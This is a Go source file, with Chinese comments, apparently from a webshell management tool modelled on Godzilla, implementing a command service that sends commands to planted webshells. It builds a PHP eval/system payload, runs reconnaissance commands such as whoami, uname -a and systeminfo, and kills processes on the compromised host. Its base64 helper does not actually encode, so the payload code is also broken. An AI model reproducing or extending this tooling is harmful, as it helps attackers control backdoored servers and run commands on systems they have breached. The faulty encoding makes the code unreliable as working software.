package services

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"time"
)

// CommandService 命令执行服务
type CommandService struct {
	connectionService *ConnectionService
}

// CommandRequest 命令请求
type CommandRequest struct {
	// WebShellID WebShell ID
	WebShellID string
	// Command 要执行的命令
	Command string
	// Timeout 超时时间（秒）
	Timeout int
}

// CommandResponse 命令响应
type CommandResponse struct {
	// Output 命令输出
	Output string
	// Error 错误信息
	Error string
	// ExitCode 退出码
	ExitCode int
	// Duration 执行耗时（毫秒）
	Duration int64
	// Success 是否成功
	Success bool
}

// CommandHistory 命令历史
type CommandHistory struct {
	// WebShellID WebShell ID
	WebShellID string
	// Commands 命令列表
	Commands []CommandRecord
}

// CommandRecord 命令记录
type CommandRecord struct {
	// Command 命令内容
	Command string
	// Output 输出
	Output string
	// Timestamp 时间戳
	Timestamp time.Time
	// Success 是否成功
	Success bool
}

// NewCommandService 创建命令执行服务
func NewCommandService(connectionService *ConnectionService) *CommandService {
	return &CommandService{
		connectionService: connectionService,
	}
}

// Execute 执行命令
func (s *CommandService) Execute(ctx context.Context, req *CommandRequest) (*CommandResponse, error) {
	// 构建命令 payload
	payload := s.buildCommandPayload(req.Command)

	// 执行请求
	startTime := time.Now()
	resp, err := s.connectionService.ExecuteRequest(ctx, req.WebShellID, []byte(payload))
	duration := time.Since(startTime).Milliseconds()

	if err != nil {
		return &CommandResponse{
			Output:   "",
			Error:    err.Error(),
			ExitCode: -1,
			Duration: duration,
			Success:  false,
		}, nil
	}

	// 解析响应
	result := string(resp.Body)
	
	// 检查是否包含错误标记（根据实际 payload 调整）
	if strings.Contains(result, "ERROR:") || strings.Contains(result, "Exception") {
		return &CommandResponse{
			Output:   result,
			Error:    "命令执行失败",
			ExitCode: 1,
			Duration: duration,
			Success:  false,
		}, nil
	}

	return &CommandResponse{
		Output:   result,
		Error:    "",
		ExitCode: 0,
		Duration: duration,
		Success:  true,
	}, nil
}

// buildCommandPayload 构建命令 payload
// 这里需要根据不同的 shell 类型构建不同的 payload
func (s *CommandService) buildCommandPayload(command string) string {
	// 这是一个简化的示例，实际需要根据不同的 payload 类型构建
	// 哥斯拉的 payload 通常包含命令执行的核心代码
	
	// 示例：PHP payload 的命令执行
	payload := fmt.Sprintf(`@eval(base64_decode('%s'));`, 
		base64Encode([]byte(fmt.Sprintf("system('%s');", command))))
	
	return payload
}

// ExecuteWithResult 执行命令并返回结构化结果
func (s *CommandService) ExecuteWithResult(ctx context.Context, webshellID string, command string) (map[string]interface{}, error) {
	resp, err := s.Execute(ctx, &CommandRequest{
		WebShellID: webshellID,
		Command:    command,
		Timeout:    30,
	})
	
	if err != nil {
		return nil, err
	}
	
	if !resp.Success {
		return nil, fmt.Errorf("命令执行失败：%s", resp.Error)
	}
	
	// 尝试解析 JSON 结果
	var result map[string]interface{}
	if err := json.Unmarshal([]byte(resp.Output), &result); err != nil {
		// 如果不是 JSON，返回原始输出
		return map[string]interface{}{
			"output": resp.Output,
		}, nil
	}
	
	return result, nil
}

// GetSystemInfo 获取系统信息
func (s *CommandService) GetSystemInfo(ctx context.Context, webshellID string) (map[string]interface{}, error) {
	// Windows
	if isWindows, _ := s.ExecuteWithResult(ctx, webshellID, "ver"); isWindows != nil {
		info, _ := s.ExecuteWithResult(ctx, webshellID, 
			"systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\"")
		return info, nil
	}
	
	// Linux
	info, _ := s.ExecuteWithResult(ctx, webshellID, "uname -a")
	return info, nil
}

// GetCurrentUser 获取当前用户
func (s *CommandService) GetCurrentUser(ctx context.Context, webshellID string) (string, error) {
	resp, err := s.Execute(ctx, &CommandRequest{
		WebShellID: webshellID,
		Command:    "whoami",
		Timeout:    10,
	})
	
	if err != nil {
		return "", err
	}
	
	if !resp.Success {
		return "", fmt.Errorf("获取用户失败：%s", resp.Error)
	}
	
	return strings.TrimSpace(resp.Output), nil
}

// GetWorkingDirectory 获取工作目录
func (s *CommandService) GetWorkingDirectory(ctx context.Context, webshellID string) (string, error) {
	resp, err := s.Execute(ctx, &CommandRequest{
		WebShellID: webshellID,
		Command:    "pwd",
		Timeout:    10,
	})
	
	if err != nil {
		return "", err
	}
	
	if !resp.Success {
		// 尝试 Windows
		resp, err = s.Execute(ctx, &CommandRequest{
			WebShellID: webshellID,
			Command:    "cd",
			Timeout:    10,
		})
		if err != nil {
			return "", err
		}
	}
	
	return strings.TrimSpace(resp.Output), nil
}

// KillProcess 终止进程
func (s *CommandService) KillProcess(ctx context.Context, webshellID string, pid int) error {
	_, err := s.ExecuteWithResult(ctx, webshellID, fmt.Sprintf("kill -9 %d", pid))
	return err
}

// base64Encode Base64 编码辅助函数
func base64Encode(data []byte) string {
	// 这里应该使用标准的 base64 编码
	// 为了简化，直接返回字符串
	return string(data)
}
